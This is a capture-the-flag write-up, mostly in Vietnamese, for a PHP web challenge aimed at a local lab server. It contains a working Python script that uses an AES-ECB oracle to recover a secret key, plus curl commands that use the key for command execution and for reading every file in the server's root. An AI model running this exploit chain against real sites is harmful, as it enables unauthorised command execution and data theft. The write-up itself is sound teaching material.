# EncryptBoizzz


## Enumeration
`source-code`: http://localhost:2010?debug=hint
```php
define('BLOCK_SIZE', 16);

function pad($string) {
	if (strlen($string) % BLOCK_SIZE === 0)
		$plaintext = $string;
	else  {
		$s = BLOCK_SIZE - strlen($string) % BLOCK_SIZE;
		$plaintext = $string.str_repeat(chr($s), $s);
	} 
	return $plaintext;
}
function encrypt($name) {
	global $auth_key, $key_for_enc; // from config.php with luv!!

	$method = 'AES-128-ECB';
	$plaintext = pad($name.$auth_key);
	return bin2hex(openssl_encrypt($plaintext, $method, $key_for_enc, OPENSSL_RAW_DATA));
}

if (isset($_GET["name"])) 
	$_SESSION["name"] = encrypt($_GET['name']);

if (isset($_GET['file'])) { // safe() in config.php, try to guess my filter =))
	if (safe($_GET['file'])) 
		@readfile($_GET['file']);
	else die("Dont hack me please =((((");
}

if (isset($_GET['auth_key'])) {
	if ($_GET['auth_key'] === $auth_key) {
		if ( isset($_GET["command"]) && strlen($_GET["command"]) <= 5)
			@system($_GET["command"]);
	}
	else echo "Wrong auth_key!!";
}
```

**Review source-code**:  

1. Chương trình lấy `name parameter` mà ta cung cấp, nối với `$auth_key` rồi encrypt với method `AES-128-ECB`(Electronic Code Block) và convert sang hexdecimal rồi gán cho session. 

2. Cho file parameter và ta có thể đọc được các file trong hệ thống, tuy nhiên hàm này có đi qua 1 hàm fitler là `safe()`, ta có thể dùng `file` để đọc `/tmp/sess_[PHPSESSID]` và thấy được kết quả sau khi encrypt.

3. Cho `auth_key parameter`, nếu cung cấp đúng `auth_key` thì cho phép thực thi code tuy nhiên bị giới hạn không quá 5 ký tự.

## Exploit
Thuận toán ECB encryption là 1 thuật toán mã hóa không an toàn, đặc biệt khi `block_size` quá bé như 16 bytes. 

Ta biết rằng thuật toán ECB chia plaintext ra thành các block 16 bytes và encrypt các block này độc lập với nhau. Nếu chưa đủ 16 bytes thì thuật toán sẽ tự thêm padding cho đủ 16 bytes. 

Nếu ta request: `?name= 'A' * 32` thì ta sẽ được 2 block A sau khi encrypt là như nhau.
```
5673760b1cc65c365e93fa8f4317a2c4

5673760b1cc65c365e93fa8f4317a2c4

ddef00dfaf0fc11ded05777122bec5c5
5fec0e7366a611d06db4ea75b91cedc3
```
**Reference**: https://zachgrace.com/posts/attacking-ecb/

Như link tham khảo trên, ta thấy rằng có thể đọc được auth_key bằng cách brute-force từng byte của auth_key. 

**Python Exploit**:
```python
import requests
import string
import re

url = 'http://localhost:2010/'
characters = string.digits + string.ascii_letters
auth_key = ''

cookies = {
	'PHPSESSID': '420e324bd72e1caf08a5cdf5d28317b4'
}

def check():
	r = requests.get(url, cookies=cookies, params={'file': '/tmp/sess_420e324bd72e1caf08a5cdf5d28317b4'})
	
	block = re.findall('name|s:.*:"(.*)";', r.text)[1]

	return block[0:32] == block[32:64]


for i in range(15, -1, -1):
	for c in characters:
		payload = 'A' * i + auth_key + c + 'A' * i

		r = requests.get(url, cookies=cookies, params={'name': payload})

		print(c)

		if check():
			auth_key += c
			print('[FOUND] - ' + auth_key)
			break
```

**auth_key**: `AuthKey4N00b3r`

Có được auth_key rồi, tìm flag thôi!!

```bash
# List file tìm được file chứa flag
curl 'http://localhost:2010/?command=ls%20/&auth_key=AuthKey4N00b3r'
# nice_flag_for_new_kcsc_member.txt
```
Thử `?file=/nice_flag_for_new_kcsc_member.txt` nhưng không thể đọc được, có lẽ đã bị hàm safe() filter. Tuy nhiên ta vẫn có thể dùng m4(command tựa cat) cùng với wildcard(`*`) để đọc hết file ở root directory.
```bash
curl 'http://localhost:2010/?command=m4%20/*&auth_key=AuthKey4N00b3r'
```

**flag**: `KCSC{flag_for_testing}`
